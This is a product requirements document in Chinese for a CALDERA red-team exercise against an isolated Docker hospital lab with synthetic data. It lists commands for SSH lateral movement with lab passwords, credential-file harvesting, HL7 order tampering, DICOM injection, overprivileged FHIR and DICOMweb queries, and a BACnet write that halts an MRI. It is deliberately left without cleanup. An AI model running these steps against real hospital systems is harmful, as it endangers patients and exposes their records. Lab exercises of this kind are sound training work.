---
title: PRD：CALDERA 攻擊本靶場步驟
version: "1.1"
date: "2026-07-25"
type: Product Requirements Document
related:
  - CALDERA-對接說明.md
  - PRD-迷你虛擬醫院Docker靶場.md
---

# PRD：CALDERA 攻擊本靶場步驟

| 欄位 | 內容 |
|---|---|
| 版本 | 1.1 |
| 日期 | 2026-07-25 |
| 依據 | [CALDERA-對接說明.md](./CALDERA-對接說明.md) |
| 前提 | 靶場已 `docker compose up`；CALDERA Server 自行建置 |
| 還原 | **不含** Cleanup／Rollback；CALDERA **不**自動還原靶場 |

> 僅限隔離實驗室。合成資料 only，禁止連真實醫院網路。

---

## 1. 攻擊鏈總覽

```text
vendor-entry
  → SSH → biomed-ws
      → 讀 /opt/hospital/creds/*
      → HL7 醫囑錯配
      → DICOM C-ECHO／測試 C-STORE
      → DICOMweb 越權
      → FHIR 過寬查詢
      → BACnet Write → MRI PROTECTIVE_STOP
```

| 項目 | 建議值 |
|---|---|
| Adversary | `HOSP-CAP-01` |
| Operation | `HOSPITAL-REDTEAM-DEMO-01` |
| Planner | **atomic**（固定順序） |
| 起始 Group | `hospital-entry` |
| 結束 Ability | `HOSP-BAC-01`（之後無 Cleanup） |

---

## 2. Agent 安裝（攻擊前）

| 優先 | 主機 | Host SSH | 帳密 | Agent Group |
|---|---|---|---|---|
| 必裝 | `vendor-entry` | `localhost:2221` | `vendor` / `Vendor@123` | `hospital-entry` |
| 建議 | `biomed-ws` | `localhost:2222` | `biomed` / `Vendor@123` | `hospital-biomed` |
| 可選 | `protocol-runner` | `localhost:2223` | `runner` / `Runner@123` | `hospital-protocol` |

C2：容器內 Agent 連 `host.docker.internal:<CALDERA_port>`。

---

## 3. 攻擊步驟（Ability 順序）

| 序 | Ability | 執行點 | 動作 |
|---|---|---|---|
| 1 | `HOSP-HOST-01` Discovery | vendor-entry | 主機／網路／路由探索（`hostname`、`ip a`、`ip route`） |
| 2 | `HOSP-HOST-02` Lateral | vendor-entry | SSH 橫向至 `biomed@10.77.20.10`（密碼 `Vendor@123`） |
| 3 | `HOSP-HOST-03` Harvest | biomed-ws | 讀取 `/opt/hospital/creds/*` |
| 4 | `HOSP-HL7-01` | biomed 或 runner | HL7 錯配 ORM：`hl7-send --host 10.77.30.10 --port 2575 --file .../orm_mismatch.hl7` |
| 5 | `HOSP-DCM-01` | protocol-runner | `echoscu -aec HOSP_PACS 10.77.40.10 11112`；`dicom-test-store --host 10.77.40.10 --accession TEST-ATTACK-001` |
| 6 | `HOSP-WEB-01` | protocol-runner | DICOMweb 越權：`curl -u overprivileged:lab-dicomweb-token-overprivileged http://10.77.40.12:8042/dicom-web/studies` |
| 7 | `HOSP-FHIR-01` | protocol-runner | FHIR 過寬：`curl -H "Authorization: Bearer lab-fhir-token-overprivileged" http://10.77.20.20:8080/fhir/Patient` |
| 8 | `HOSP-BAC-01` | protocol-runner | `bacnet-write --via bacnet --value ALARM --chiller-host 10.77.50.20` → MRI 停機 |

**禁止：** 在 Adversary／Operation 中加入任何 Cleanup、Rollback、Reset Ability。

協議步驟若 `protocol-runner` 無 Agent，可改在能連目標 IP 的主機（如 biomed-ws）執行同等 CLI。

---

## 4. 成功觀測

| 步驟 | 預期 |
|---|---|
| HL7 | `http://127.0.0.1:8085/worklist` 出現錯配／重複醫囑 |
| DICOM | Orthanc（`http://127.0.0.1:8042`）出現 `TEST-`／`TEST-ATTACK-001` Study |
| FHIR | 過寬 token 查到多個合成 Patient |
| BACnet | BMS `ALARM`；`GET http://127.0.0.1:8090/status` → `PROTECTIVE_STOP` |
| 場景頁 | `http://127.0.0.1:8100` 狀態變紅／停機 |

攻擊效果保留，不由 CALDERA 清除。
